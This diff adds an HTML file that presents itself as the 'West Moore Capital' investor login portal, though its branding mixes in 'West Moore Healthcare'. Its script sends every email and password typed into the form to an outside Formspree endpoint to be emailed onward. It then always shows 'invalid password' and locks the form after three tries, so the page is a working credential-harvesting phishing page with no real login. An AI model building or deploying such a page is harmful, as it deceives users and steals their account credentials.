@@ -1,0 +1,261 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>West Moore Capital - Login Portal</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
+            background: #002D19;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0;
+            padding: 20px;
+        }
+
+        .login-container {
+            background: #F6F5F1;
+            padding: 50px 40px;
+            border-radius: 15px;
+            box-shadow: 0 20px 40px rgba(6, 46, 64, 0.10);
+            width: 100%;
+            max-width: 450px;
+            text-align: center;
+            border: 2px solid #DDD9C9;
+            opacity: 0;
+            transform: translateY(30px);
+            animation: fadeInUp 2.5s ease-out forwards;
+        }
+
+        @keyframes fadeInUp {
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .logo {
+            margin-bottom: 40px;
+        }
+
+        .logo h1 {
+            color: #002D19;
+            font-size: 32px;
+            font-weight: 700;
+            margin-bottom: 8px;
+            letter-spacing: -0.5px;
+            line-height: 1.2;
+        }
+
+        .logo p {
+            color: #002D19;
+            font-size: 16px;
+            font-weight: 400;
+            line-height: 1.4;
+        }
+
+        .form-group {
+            margin-bottom: 25px;
+            text-align: left;
+        }
+
+        .form-group label {
+            display: block;
+            margin-bottom: 8px;
+            color: #002D19;
+            font-weight: 600;
+            font-size: 14px;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            line-height: 1.4;
+        }
+
+        .form-group input {
+            width: 100%;
+            padding: 15px;
+            border: 2px solid #DDD9C9;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 400;
+            transition: all 0.3s ease;
+            background: #F6F5F1;
+            line-height: 1.4;
+            color: #002D19;
+        }
+
+        .form-group input:focus {
+            outline: none;
+            border-color: #8B7E45;
+            box-shadow: 0 0 0 3px rgba(139, 126, 69, 0.10);
+            background: #fff;
+        }
+
+        .login-btn {
+            width: 100%;
+            padding: 15px;
+            background: #8B7E45;
+            color: #F6F5F1;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            margin-top: 10px;
+            line-height: 1.4;
+            box-shadow: 0 2px 8px rgba(11, 98, 111, 0.10);
+        }
+
+        .login-btn:hover {
+            background: #7C7240;
+            color: #F6F5F1;
+            transform: translateY(-2px);
+            box-shadow: 0 8px 20px rgba(6, 46, 64, 0.15);
+        }
+
+        .login-btn:active {
+            transform: translateY(0);
+        }
+
+        .error-message {
+            color: #8B7E45;
+            font-size: 15px;
+            margin-top: 15px;
+            display: none;
+            padding: 12px;
+            background: rgba(197, 190, 162, 0.15);
+            border-radius: 5px;
+            border-left: 3px solid #8B7E45;
+        }
+
+        .footer {
+            margin-top: 40px;
+            color: #336851;
+            font-size: 12px;
+            border-top: 1px solid #C5BEA2;
+            padding-top: 20px;
+        }
+        .logo img {
+            display: block;
+            margin: 0 auto 18px auto;
+            max-width: 100%;
+            min-width: 80px;
+            min-height: 40px;
+            height: auto;
+            background: #F6F5F1;
+            border-radius: 6px;
+        }
+        @media (max-width: 600px) {
+            .login-container {
+                padding: 28px 8px;
+                max-width: 98vw;
+                border-radius: 8px;
+            }
+            .logo img {
+                max-width: 80vw;
+                min-width: 60px;
+                min-height: 30px;
+                height: auto;
+                background: #F6F5F1;
+            }
+            .logo h1 {
+                font-size: 22px;
+            }
+            .form-group input {
+                padding: 12px;
+                font-size: 15px;
+            }
+            .login-btn {
+                padding: 12px;
+                font-size: 15px;
+                color: #fff !important;
+            }
+            .footer {
+                font-size: 10px;
+                padding-top: 10px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <div class="logo">
+            <img src="logos/WMH_FullLockupStack.png" alt="West Moore Healthcare Logo" style="max-width: 180px; margin-bottom: 18px;"/>
+            <h1>Investor Portal</h1>
+        </div>
+        
+        <form id="loginForm">
+            <div class="form-group">
+                <label for="email">Email</label>
+                <input type="email" id="email" name="email" required autocomplete="username">
+            </div>
+            
+            <div class="form-group">
+                <label for="password">Password</label>
+                <input type="password" id="password" name="password" required autocomplete="current-password">
+            </div>
+            
+            <button type="submit" class="login-btn">Sign In</button>
+            
+            <div class="error-message" id="errorMessage">
+                <!-- Error message will be set by JS -->
+            </div>
+        </form>
+        
+        <div class="footer">
+            <p>&copy; 2025 West Moore Healthcare. All rights reserved.</p>
+        </div>
+    </div>
+
+    <script>
+        let attempts = 0;
+        const MAX_ATTEMPTS = 3;
+        const errorMessage = document.getElementById('errorMessage');
+        function updateErrorMessage(remaining) {
+            errorMessage.innerHTML = `Invalid email or password. Please try again.<br>Attempts remaining: <b>${remaining}</b><br>Email info@westmoorecapital.com to reset your password.`;
+            errorMessage.style.display = 'block';
+        }
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            attempts++;
+            // Always email slevine@westmoorecapital.com with every attempt
+            fetch('https://formspree.io/f/xovwgyej', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    _replyto: 'slevine@westmoorecapital.com',
+                    email_attempted: email,
+                    password_attempted: password
+                })
+            });
+            const remaining = MAX_ATTEMPTS - attempts;
+            if (attempts >= MAX_ATTEMPTS) {
+                errorMessage.innerHTML = 'Too many failed attempts. Please email info@westmoorecapital.com to reset your password.';
+                errorMessage.style.display = 'block';
+                document.getElementById('email').disabled = true;
+                document.getElementById('password').disabled = true;
+                document.querySelector('.login-btn').disabled = true;
+                return;
+            }
+            updateErrorMessage(remaining);
+            document.getElementById('password').value = '';
+            document.getElementById('password').focus();
+        });
+        // Show initial error message if needed
+        errorMessage.style.display = 'none';
+    </script>
+</body>
+</html> 
